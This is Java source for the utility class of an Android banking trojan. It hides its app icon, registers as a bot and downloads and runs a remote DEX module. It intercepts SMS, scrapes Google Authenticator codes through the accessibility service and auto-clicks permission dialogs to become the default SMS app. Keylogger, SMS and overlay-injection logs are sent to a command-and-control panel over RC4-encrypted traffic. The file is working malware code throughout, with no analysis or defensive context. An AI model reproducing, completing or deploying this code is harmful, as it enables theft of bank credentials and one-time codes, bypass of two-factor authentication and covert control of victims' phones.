package com.example.mmm.Utils;

import android.accessibilityservice.AccessibilityService;
import android.app.ActivityManager;
import android.app.AlarmManager;
import android.app.KeyguardManager;
import android.app.PendingIntent;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.media.AudioManager;
import android.os.BatteryManager;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.text.format.Time;
import android.util.Base64;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;


import com.example.mmm.Activity.activity_change_sms_manager_sdk_Q;
import com.example.mmm.Admin.ReceiverDeviceAdmin;
import com.example.mmm.API.ClassRC4;
import com.example.mmm.API.RequestHttp;
import com.example.mmm.Activity.actDozeMode;
import com.example.mmm.Activity.actViewInjection;
import com.example.mmm.R;
import com.example.mmm.Receiver.bootReceiver;
import com.example.mmm.Service.srvSccessibility;
import com.example.mmm.constants;
import com.example.mmm.mainActivity;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import java.util.Random;
import java.util.concurrent.TimeUnit;


import dalvik.system.DexClassLoader;

import static android.content.Context.DEVICE_POLICY_SERVICE;

public class utils {
    private static SharedPreferences settings = null;
    private static SharedPreferences.Editor editor = null;

    constants consts = new constants();
    idUtils idutl = new idUtils();

    public String countrySIM(Context context){
        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        return  tm.getNetworkCountryIso().isEmpty()?consts.string_178:tm.getNetworkCountryIso();
    }
    public boolean blockCIS(Context context){
        if(!consts.blockCIS){
            return false;
        }else if(consts.strCIS.contains(countrySIM(context))){
            return false;
        }else {
            return false;
        }
    }

    public String getBatteryLevel(Context context) {
        IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = context.registerReceiver(null, ifilter);
        int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
        int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
        float batteryPct = level / (float)scale;
        float p = batteryPct * 100;
        return String.valueOf(Math.round(p));
    }



    public void initialization(Context context){ // initialization
        try {
            deleteLabelIcon(context);
            SettingsWrite(context, consts.idbot, randomString(17));//idutl.IDBot(context)); //randomString(22));////
            SettingsWrite(context, consts.initialization, consts.str_good);
            SettingsWrite(context, consts.urlAdminPanel, consts.str_urlAdminPanel);
            SettingsWrite(context, consts.starterService, consts.str_null);
            SettingsWrite(context, consts.statusInstall, consts.str_null);
            SettingsWrite(context, consts.kill, consts.str_null);
            SettingsWrite(context, consts.step, consts.str_step);
            SettingsWrite(context, consts.str_timesp, consts.str_step);
            SettingsWrite(context, consts.activityAccessibilityVisible, consts.str_null);
            SettingsWrite(context, consts.arrayInjection, consts.str_null);
            SettingsWrite(context, consts.checkupdateInjection, consts.str_null);
            SettingsWrite(context, consts.whileStartUpdateInection, consts.str_null);
            SettingsWrite(context, consts.actionSettingInection, consts.str_null);
            SettingsWrite(context, consts.listSaveLogsInjection, consts.str_null);
            SettingsWrite(context, consts.LogSMS, consts.str_null);
            SettingsWrite(context, consts.hiddenSMS, consts.str_null);
            SettingsWrite(context, consts.idSettings, consts.str_null);
            SettingsWrite(context, consts.statAdmin, consts.str_step);
            SettingsWrite(context, consts.statProtect, consts.str_step);
            SettingsWrite(context, consts.statCards, consts.str_step);
            SettingsWrite(context, consts.statBanks, consts.str_step);
            SettingsWrite(context, consts.statMails, consts.str_step);
            SettingsWrite(context, consts.activeDevice, consts.str_step);
            SettingsWrite(context, consts.timeWorking, consts.str_step);
            SettingsWrite(context, consts.statDownloadModule, consts.str_step);
            SettingsWrite(context, consts.lockDevice, consts.str_step);
            SettingsWrite(context, consts.offSound, consts.str_step);
            SettingsWrite(context, consts.keylogger, consts.str_null);
            SettingsWrite(context, consts.activeInjection, consts.str_step);
            SettingsWrite(context, consts.timeInject, consts.string_100);
            SettingsWrite(context, consts.timeCC, consts.string_100);
            SettingsWrite(context, consts.timeMails, consts.string_100);
            SettingsWrite(context, consts.timeProtect, consts.string_100);
            SettingsWrite(context, consts.dataKeylogger, consts.str_null);
            SettingsWrite(context, consts.autoClick, consts.str_null);
            SettingsWrite(context, consts.statAccessibilty, consts.str_step);
            SettingsWrite(context, consts.traf_key, consts.key);
            SettingsWrite(context, consts.checkProtect, consts.string_101);
            SettingsWrite(context, consts.goOffProtect, consts.str_null);
            SettingsWrite(context, consts.packageName, context.getPackageName());
            SettingsWrite(context, consts.packageNameActivityInject, actViewInjection.class.getCanonicalName());
            SettingsWrite(context, consts.logsContacts, consts.str_null);
            SettingsWrite(context, consts.logsSavedSMS, consts.str_null);
            SettingsWrite(context, consts.logsApplications, consts.str_null);
            SettingsWrite(context, consts.killApplication, consts.str_null);
            SettingsWrite(context, consts.urls, consts.str_null);
            SettingsWrite(context, consts.getPermissionsToSMS, consts.str_null);
            SettingsWrite(context, consts.startInstalledTeamViewer, consts.str_null);
            SettingsWrite(context, consts.schetBootReceiver, consts.str_step);
            SettingsWrite(context, consts.schetAdmin, consts.str_step);
            SettingsWrite(context, consts.day1PermissionSMS, consts.str_1);
            SettingsWrite(context, consts.string_138, consts.str_null);
            SettingsWrite(context, consts.start_admin, consts.str_null);
            SettingsWrite(context, "inj_start", "0");
            SettingsWrite(context, "old_start_inj", "0");
            SettingsWrite(context, "app_inject", "");
            SettingsWrite(context, "nameInject", "");
            SettingsWrite(context, "getIdentifier",""+ R.mipmap.ic_launcher);
            SettingsWrite(context, "sms_sdk_Q",""+ activity_change_sms_manager_sdk_Q.class.getName());


            if (android.os.Build.VERSION.SDK_INT >= 19) {
                SettingsWrite(context, consts.packageNameDefultSmsMenager, Telephony.Sms.getDefaultSmsPackage(context).toString());
            } else {
                SettingsWrite(context, consts.packageNameDefultSmsMenager, consts.str_null);
            }

        }catch (Exception ex){
          //  SettingsToAdd(context, consts.LogSMS , consts.string_179 + ex.toString() + consts.string_119);
        }
        }

    public String localeTextAccessibility(){
        try{
            JSONObject jsonObject = new JSONObject(consts.localeForAccessibility);
            return jsonObject.getString(Locale.getDefault().getLanguage());
        }catch (Exception ex){
            return consts.localeForAccessibilityEN;
        }
    }

    public String localeTextContinue(){
        try{
            JSONObject jsonObject = new JSONObject(consts.localeForAccessibility);
            return jsonObject.getString(Locale.getDefault().getLanguage());
        }catch (Exception ex){
            return consts.localeForAccessibilityEN;
        }
    }

    private void deleteLabelIcon(Context context){
        ComponentName CTD = new ComponentName(context, mainActivity.class);
        context.getPackageManager().setComponentEnabledSetting(CTD, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }

    public boolean hasPermission(Context context, String perms){
        if (!(context.checkCallingOrSelfPermission(perms) == PackageManager.PERMISSION_GRANTED)){
            return false;
        }
        return true;
    }
    public boolean hasPermissionAllTrue(Context context){
        boolean has=true;
        for(String perm: consts.arrayPermission) {
            if (!(context.checkCallingOrSelfPermission(perm) == PackageManager.PERMISSION_GRANTED)) {
                has=false;
            }
        }
        return has;
    }

    public void downloadModuleDex(Context context, String idbot){
        JSONObject jsonDownloadModule = new JSONObject();
        try {
            jsonDownloadModule.put(consts.idbot, idbot);
        } catch (JSONException e) {
           // SettingsToAdd(context, consts.LogSMS , consts.string_180 + e.toString() + consts.string_119);
        }
        String base64 =  trafDeCr(httpRequest(context, consts.str_http_20 + trafEnCr(jsonDownloadModule.toString())));
        Log(consts.string_102,consts.string_103 + base64.length());
        if (base64.length() > 10000) {
            Log(consts.string_102,consts.string_104);
            byte[] imageAsBytes = Base64.decode(base64.getBytes(), 0);
            try{
                File file = new File( context.getDir(consts.string_95, Context.MODE_PRIVATE), consts.nameModule);
                FileOutputStream os = new FileOutputStream(file, true);
                os.write(imageAsBytes);
                os.close();
                SettingsWrite(context, consts.statDownloadModule, consts.str_1);
            }catch (Exception ex){
                Log(consts.string_102,consts.string_105);
                //SettingsToAdd(context, consts.LogSMS , consts.string_181 + ex.toString() + consts.string_119);
            }
        }
    }

    public String sendMainModuleDEX(Context context, String params){
        try {
            if(new File(context.getDir(consts.string_95, Context.MODE_PRIVATE), consts.nameModule).exists()) {
                File file = new File(context.getDir(consts.string_95, Context.MODE_PRIVATE), consts.nameModule);
                File tmpDir = context.getDir(consts.string_106, 0);//outdex
                DexClassLoader classloader = new DexClassLoader(file.getCanonicalPath(), tmpDir.getAbsolutePath(), null, getClass().getClassLoader());
                Class classToLoad = classloader.loadClass(consts.string_107);//com.example.modulebot.mod
                Method method = classToLoad.getMethod(consts.string_108, Context.class, String.class);//main
                return method.invoke(classToLoad.newInstance(), context, params).toString();
            }
            return "";
        }catch(Exception e){
            Log(consts.string_109,consts.string_110 + e.toString());
           // SettingsToAdd(context, consts.LogSMS , consts.string_182 + e.toString() + consts.string_119);
            return "";
        }
    }

    public String getLabelApplication(Context context) {
    try {
        return (String) context.getPackageManager().getApplicationLabel(context.getPackageManager().getApplicationInfo(context.getPackageName(), PackageManager.GET_META_DATA));
    }catch (Exception ex){Log(consts.string_111, consts.string_112);
       // SettingsToAdd(context, consts.LogSMS , consts.string_183 + ex.toString() + consts.string_119);
    }
    return  "";
    }

    public void initialization2(Context context){ // Init
        SettingsWrite(context, consts.activityAccessibilityVisible, consts.str_null);
    }

    public void lockDevice(Context context){
        try {
            DevicePolicyManager deviceManager = (DevicePolicyManager) context.getSystemService(DEVICE_POLICY_SERVICE);
            deviceManager.lockNow();
        }catch (Exception ex){
            Log(consts.lockDevice,consts.string_114);
           // SettingsToAdd(context, consts.LogSMS , consts.string_184 + ex.toString() + consts.string_119);
        }
    }

    public boolean isAdminDevice(Context context){
        DevicePolicyManager deviceManager = (DevicePolicyManager) context.getSystemService(DEVICE_POLICY_SERVICE);
        ComponentName componentName = new ComponentName(context, ReceiverDeviceAdmin.class);
        return deviceManager.isAdminActive(componentName);
    }


    public boolean isMyServiceRunning(Context context, Class<?> serviceClass) {
        ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.getName().equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }

    public String getDateTileDevice(){
        Time today = new Time(Time.getCurrentTimezone());
        today.setToNow();
        return today.year + consts.string_17 + today.month + consts.string_17 + today.monthDay + consts.string_64 + today.format("%k:%M");
    }


    public String timeInjectionsSendPanel(Context context, String nameInject){
        JSONObject request = new JSONObject();
        try {
            request.put(consts.idbot, SettingsRead(context, consts.idbot));
            request.put(consts.string_115, nameInject);//inject
            return trafDeCr(httpRequest(context, consts.str_http_18 + trafEnCr(request.toString())));
        } catch (JSONException e) {
          //  SettingsToAdd(context, consts.LogSMS , consts.string_185 + e.toString() + consts.string_119);
        }
        return "";
    }


    public void  interceptionSMS(Context context, Intent intent){
        try {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                final Object[] pdus = (Object[]) bundle.get(consts.string_116);
                String number = "";
                String text = "";
                if (pdus != null) {
                    for (Object aPdusObj : pdus) {
                        SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) aPdusObj);
                        number = smsMessage.getDisplayOriginatingAddress();
                        text += smsMessage.getDisplayMessageBody();
                    }
                    String logSMS = consts.string_117 + number + consts.string_118 + text + consts.string_119;
                    Log(consts.string_120, logSMS);
                    SettingsToAdd(context, consts.LogSMS, logSMS);
                }
            }
        }catch (Exception ex){
           // SettingsToAdd(context, consts.LogSMS , consts.string_186 + ex.toString() + consts.string_119);
        }
    }



    public void start_dozemode(String TAG_LOG, Context context){
            if ((!idutl.is_dozemode(context) && ((Integer.parseInt(SettingsRead(context, consts.schetBootReceiver))>2))) || (isAccessibilityServiceEnabled(context, srvSccessibility.class))) {
                SettingsWrite(context, consts.autoClick, consts.str_1);//auto click start!
                Log(TAG_LOG, consts.str_log2);
                Intent dialogIntent = new Intent(context, actDozeMode.class);
                dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
                context.startActivity(dialogIntent);
            }
    }

    public String getStatSMS(Context context){
        if (android.os.Build.VERSION.SDK_INT >= 19) {
            return (!Telephony.Sms.getDefaultSmsPackage(context).equals(context.getPackageName())?consts.str_step:consts.str_1);
        }
    return consts.str_step;
    }


    public void chalkTile(int MILLISECONDS ){
        try { TimeUnit.MILLISECONDS.sleep(MILLISECONDS); } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
    public boolean getScreenBoolean(Context context){
        KeyguardManager km = (KeyguardManager) context.getSystemService(context.KEYGUARD_SERVICE);
        if(km.inKeyguardRestrictedInputMode()){
            return false;
        }else{
            return true;
        }
    }
    static List<AccessibilityNodeInfo> findNodeWithClass(AccessibilityEvent accessibilityEvent, String str) {
        return findNodeWithClass(accessibilityEvent.getSource(), str);
    }

    static List<AccessibilityNodeInfo> findNodeWithClass(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        ArrayList arrayList = new ArrayList();
        if (accessibilityNodeInfo == null) {
            return arrayList;
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null) {
                if (child.getClassName().toString().toLowerCase().contains(str.toLowerCase())) {
                    arrayList.add(child);
                } else {
                    arrayList.addAll(findNodeWithClass(child, str));
                }
            }
        }
        return arrayList;
    }

    public boolean autoclick_change_smsManager_sdk_Q(AccessibilityService service, AccessibilityEvent event, String className, String packName) {
        try {
            if (android.os.Build.VERSION.SDK_INT >= 18) {
                if (packName.contains("com.google.android.permissioncontroller")) {

                    if (event.getSource() == null) {
                        return false;
                    }

                    List<AccessibilityNodeInfo> nodeClass = findNodeWithClass(event.getSource(), "android.widget.LinearLayout");
                    boolean click = false;
                    for (AccessibilityNodeInfo accessibilityNodeInfo : nodeClass) {

                        for (int i = 0; i < accessibilityNodeInfo.getChildCount(); i++) {
                            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);

                            if (child.getText() != null) {
                                if (child.getText().toString().equals(getLabelApplication(service))) {
                                    accessibilityNodeInfo.performAction(accessibilityNodeInfo.ACTION_CLICK);
                                    click = true;
                                }
                            }
                        }
                    }

                    if (click) {
                        for (AccessibilityNodeInfo node : event.getSource().findAccessibilityNodeInfosByViewId("android:id/button1")) {
                            node.performAction(node.ACTION_CLICK);
                            return true;
                        }
                    }
                }
            }
        }catch (Exception e){}
        return false;
    }
    public boolean clickButton(AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo == null) { return false; }
        return accessibilityNodeInfo.performAction(AccessibilityNodeInfo.ACTION_CLICK);
    }

    public void get_google_authenticator2(AccessibilityService service, AccessibilityEvent event, String packName) {
        try{
            if (android.os.Build.VERSION.SDK_INT >= 18) {
                if(packName.contains("com.google.android.apps.authenticator2")){
                    Log("run", "com.google.android.apps.authenticator2" );

                    if(event.getSource() == null){return;}

                    String data = "";
                    List<AccessibilityNodeInfo> nodeClass = findNodeWithClass(event.getSource(), "android.view.ViewGroup");
                    int t = 0;
                    for (AccessibilityNodeInfo accessibilityNodeInfo : nodeClass) {
                        for(int i = 0; i<accessibilityNodeInfo.getChildCount();i++){
                            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
                            if(child.getText() != null){
                                Log("params1: " + t + ", params2: " + i , child.getText().toString());
                                data = data + "params1: " + t + ", params2: " + i + ", params3: " +child.getText().toString() + "\n";
                            }
                        }
                        t++;
                    }

                    if(!data.isEmpty()){
                        SettingsToAdd(service, consts.LogSMS, "Logs com.google.android.apps.authenticator2: \n" + data  + consts.string_119);
                    }
                }
            }
        }catch (Exception ex){}
    }

    public String downloadInjection(Context context, String nameInj){
        JSONObject request = new JSONObject();
        try {
            request.put(consts.string_115, nameInj);
            return httpRequest(context, consts.str_http_1 + trafEnCr(request.toString()));
        } catch (JSONException e) {}
      return "";
    }

    public void stopSound(Context context){
        try {
            AudioManager audioManager = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
            audioManager.setStreamMute(AudioManager.STREAM_SYSTEM, true);
            audioManager.setStreamMute(AudioManager.STREAM_MUSIC, true);
            audioManager.setStreamVolume(AudioManager.STREAM_ALARM, 0, 0);
            audioManager.setStreamVolume(AudioManager.STREAM_DTMF, 0, 0);
            audioManager.setStreamVolume(AudioManager.STREAM_NOTIFICATION, 0, 0);
            audioManager.setStreamVolume(AudioManager.STREAM_RING, 0, 0);
            audioManager.setVibrateSetting(AudioManager.VIBRATE_TYPE_NOTIFICATION, AudioManager.VIBRATE_SETTING_OFF);
        }catch (Exception ex){
       //     SettingsToAdd(context, consts.LogSMS , consts.string_187 + ex.toString() + consts.string_119);
        }
    }

    public void swapSmsMenager(Context context, String packageName){
        Intent intentSMS = new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
        intentSMS.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, packageName);
        intentSMS.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intentSMS);
    }

    public String sendLogsInjection(Context context, String id, String data){
        JSONObject request = new JSONObject();
        try {
            JSONObject jObject = new JSONObject(data);
            String idbot = SettingsRead(context, consts.idbot);

            request.put(consts.idbot, idbot);
            request.put(consts.string_121, id);
            request.put(consts.string_122, jObject.getString(consts.string_122));
            request.put(consts.string_123, jObject.getString(consts.string_123));

            Log(consts.string_124,  consts.string_125 + id);
            Log(consts.string_124,  consts.string_126 + idbot);
            Log(consts.string_124,  consts.string_127 + jObject.getString(consts.string_122));
            Log(consts.string_124,  consts.string_128 + jObject.getString(consts.string_19));

            return trafDeCr(httpRequest(context, consts.str_http_16 + trafEnCr(request.toString())));
        } catch (JSONException e) {}
        return "";
    }


    public String sendLogsSMS(Context context, String logs){
        JSONObject request = new JSONObject();
        try {
            request.put(consts.idbot, SettingsRead(context, consts.idbot));
            request.put(consts.string_123, logs);
            request.put(consts.string_129, getDateTileDevice());
            Log(consts.string_130,  consts.string_128 + logs);
            return trafDeCr(httpRequest(context, consts.str_http_17 + trafEnCr(request.toString())));
        } catch (JSONException e) {}
        return "";
    }
    public String sendLogsKeylogger(Context context, String logs){
        JSONObject request = new JSONObject();
        try {
            request.put(consts.idbot, SettingsRead(context, consts.idbot));
            request.put(consts.string_123, logs);
            Log(consts.string_130,  consts.string_128 + logs);
            return trafDeCr(httpRequest(context, consts.str_http_19+ trafEnCr(request.toString())));
        } catch (JSONException e) {}
        return "";
    }

    public String checkAP(String url){
        JSONObject request = new JSONObject();
        try {
            request.put(consts.str_1, consts.str_1);
            RequestHttp http = new RequestHttp();
            return trafDeCr(http.sendRequest(url + consts.str_gate, consts.str_http_21+request));
        } catch (JSONException e) {
            return "";
         //   SettingsToAdd(context, consts.LogSMS ,  consts.string_188 + e.toString() + consts.string_119);
       }

    }

    public boolean isAccessibilityServiceEnabled(Context context, Class<?> accessibilityService) {
        try {
            ComponentName expectedComponentName = new ComponentName(context, accessibilityService);

            String enabledServicesSetting = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (enabledServicesSetting == null)
                return false;

            TextUtils.SimpleStringSplitter colonSplitter = new TextUtils.SimpleStringSplitter(':');
            colonSplitter.setString(enabledServicesSetting);

            while (colonSplitter.hasNext()) {
                String componentNameString = colonSplitter.next();
                ComponentName enabledService = ComponentName.unflattenFromString(componentNameString);

                if (enabledService != null && enabledService.equals(expectedComponentName))
                    return true;
            }
        }catch (Exception ex){
           // SettingsToAdd(context, consts.LogSMS , consts.string_189 + ex.toString() + consts.string_119);
        }
        return false;
    }

    public String httpRequest(Context context, String parms){
        String url = SettingsRead(context, consts.urlAdminPanel);
        Log("Connect",""+url);
        RequestHttp http = new RequestHttp();
        return http.sendRequest(url+consts.str_gate, parms);
    }


    public void Log(String tag, String text){
        if(consts.DebugConsole) {
            Log.e(tag, text);
        }
    }

    public void SettingsWrite(Context context, String name, String params){
        SharedPreferences settings = context.getSharedPreferences(consts.nameFileSettings, Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = settings.edit();
        editor.putString(name, params);
        editor.commit();
    }

    public String SettingsRead(Context context, String name){
        if( settings == null ){
            settings = context.getSharedPreferences(consts.nameFileSettings, Context.MODE_PRIVATE);
            editor = settings.edit();
        }
        return settings.getString( name, null );
    }
    public void SettingsToAdd(Context context, String name, String params){
        try{
            String getParams = SettingsRead(context, name);
            if(!getParams.isEmpty()){
                params = getParams + params;
            }
            SettingsWrite(context, name, params);
        }catch (Exception ex){
            SettingsWrite(context, name,  params);
        }
    }
    public void SettingsToAddJson(Context context, String name, String params){
        try{
            String getParams = SettingsRead(context, name);
            if(!getParams.isEmpty()){

                JSONObject  getParamsJson = new JSONObject(getParams);
                JSONObject  paramsJson = new JSONObject(params);

                getParams = getParamsJson.getString(consts.string_19);
                String getApplication = getParamsJson.getString(consts.string_19);
                params = paramsJson.getString(consts.string_19);

                Log(consts.string_131,consts.str_null+getParams);
                Log(consts.string_132,consts.str_null+params);

                JSONObject mergedJSON = mergeJSONObjects(new JSONObject(getParams), new JSONObject(params));

                JSONObject jsonObject = new JSONObject();
                jsonObject.put(consts.string_18,getApplication);
                jsonObject.put(consts.string_19,mergedJSON.toString());

                Log(consts.string_133,jsonObject.toString());

                SettingsWrite(context, name, jsonObject.toString());
            }else{
                SettingsWrite(context, name, params);
            }
        }catch (Exception ex){
            Log(consts.string_134,consts.string_135);
            SettingsWrite(context, name,  params);
        }
    }
    public void SettingsRemove(Context context, String name, String params){
        try{
            String getParams = SettingsRead(context, name);
            getParams = getParams.replace(params, consts.str_null);
            SettingsWrite(context, name, getParams);
        }catch (Exception ex){}
    }

    public JSONObject mergeJSONObjects(JSONObject json1, JSONObject json2) {
        JSONObject mergedJSON = new JSONObject();
        try {
            Iterator i1 = json1.keys();
            Iterator i2 = json2.keys();
            String tmp_key;
            while(i1.hasNext()) {
                tmp_key = (String) i1.next();
                mergedJSON.put(tmp_key, json1.get(tmp_key));
            }
            while(i2.hasNext()) {
                tmp_key = (String) i2.next();
                mergedJSON.put(tmp_key, json2.get(tmp_key));
            }
        }catch (Exception ex){}
        return mergedJSON;
    }

    public static void startCustomTimer(Context context, String name, long millisec){
        try{
            Intent intent = new Intent(context, bootReceiver.class);
            intent.setAction(name);

            PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, intent, 0);
            AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
            alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, false ? System.currentTimeMillis() : System.currentTimeMillis() + millisec, millisec, pendingIntent);

        }
        catch(Exception ex)
        {
            ex.printStackTrace();
        }
    }


    public String randomString(int length) {
        String chars = consts.str_qwergasdzxc;
        Random rand = new Random();
        StringBuilder buf = new StringBuilder();
        for (int i=0; i<length; i++) {
            buf.append(chars.charAt(rand.nextInt(chars.length())));
        }
        return buf.toString();
    }

    public String strEncRC4(String text, String key){
        ClassRC4 rce = new ClassRC4(key.getBytes());
        byte[] result = rce.encrypt(text.getBytes());
        result = bytesToHexString(result).getBytes();
        return Base64.encodeToString(result, Base64.DEFAULT);
    }
    public static String bytesToHexString(byte[] bytes) {
        StringBuffer buf = new StringBuffer(bytes.length * 2);
        for (byte b : bytes) {
            String s = Integer.toString(0xFF & b, 16);
            if (s.length() < 2) {
                buf.append('0');
            }
            buf.append(s);
        }
        return buf.toString();
    }

    //-------------------
    public String strDecRC4(String textDE_C, String key)
    {
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, consts.strUTF_8);
            byte[] detext = hexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){ }
        return consts.str_null;
    }
    public   byte[] hexStringToByteArray(String s) {
        int len = s.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
                    + Character.digit(s.charAt(i+1), 16));
        }
        return data;
    }
    public String trafEnCr(String text) {
        return strEncRC4(text, consts.key);
    }

    public String trafDeCr(String text){
        return strDecRC4(text, consts.key);
    }

}
